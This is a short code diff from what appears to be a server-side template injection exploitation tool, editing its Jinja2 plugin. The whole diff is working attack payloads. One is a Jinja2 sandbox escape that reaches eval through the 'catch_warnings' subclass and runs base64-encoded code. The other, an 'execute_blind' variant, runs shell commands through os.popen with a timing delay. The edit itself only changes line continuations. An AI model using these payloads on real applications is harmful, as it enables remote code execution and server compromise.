@@ -30,20 +30,20 @@ class Jinja2_old(python.Python):
             },
             'evaluate': {
                 'call': 'render',
-                'evaluate': """{{% set d = "eval(__import__('base64').urlsafe_b64decode('{code_b64}'))" %}}{{% for c in [].__class__.__base__.__subclasses__() %}} {{% if c.__name__ == 'catch_warnings' %}}
-{{% for b in c.__init__.__globals__.values() %}} {{% if b.__class__ == {{}}.__class__ %}}
-{{% if 'eval' in b.keys() %}}
-{{{{ b['eval'](d) }}}}
-{{% endif %}} {{% endif %}} {{% endfor %}}
+                'evaluate': """{{% set d = "eval(__import__('base64').urlsafe_b64decode('{code_b64}'))" %}}{{% for c in [].__class__.__base__.__subclasses__() %}} {{% if c.__name__ == 'catch_warnings' %}}\
+{{% for b in c.__init__.__globals__.values() %}} {{% if b.__class__ == {{}}.__class__ %}}\
+{{% if 'eval' in b.keys() %}}\
+{{{{ b['eval'](d) }}}}\
+{{% endif %}} {{% endif %}} {{% endfor %}}\
 {{% endif %}} {{% endfor %}}"""
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """{{% set d = "__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode() + ' && sleep {delay}').read()" %}}{{% for c in [].__class__.__base__.__subclasses__() %}} {{% if c.__name__ == 'catch_warnings' %}}
-{{% for b in c.__init__.__globals__.values() %}} {{% if b.__class__ == {{}}.__class__ %}}
-{{% if 'eval' in b.keys() %}}
-{{{{ b['eval'](d) }}}}
-{{% endif %}} {{% endif %}} {{% endfor %}}
+                'execute_blind': """{{% set d = "__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode() + ' && sleep {delay}').read()" %}}{{% for c in [].__class__.__base__.__subclasses__() %}} {{% if c.__name__ == 'catch_warnings' %}}\
+{{% for b in c.__init__.__globals__.values() %}} {{% if b.__class__ == {{}}.__class__ %}}\
+{{% if 'eval' in b.keys() %}}\
+{{{{ b['eval'](d) }}}}\
+{{% endif %}} {{% endif %}} {{% endfor %}}\
 {{% endif %}} {{% endfor %}}"""
             },
         })
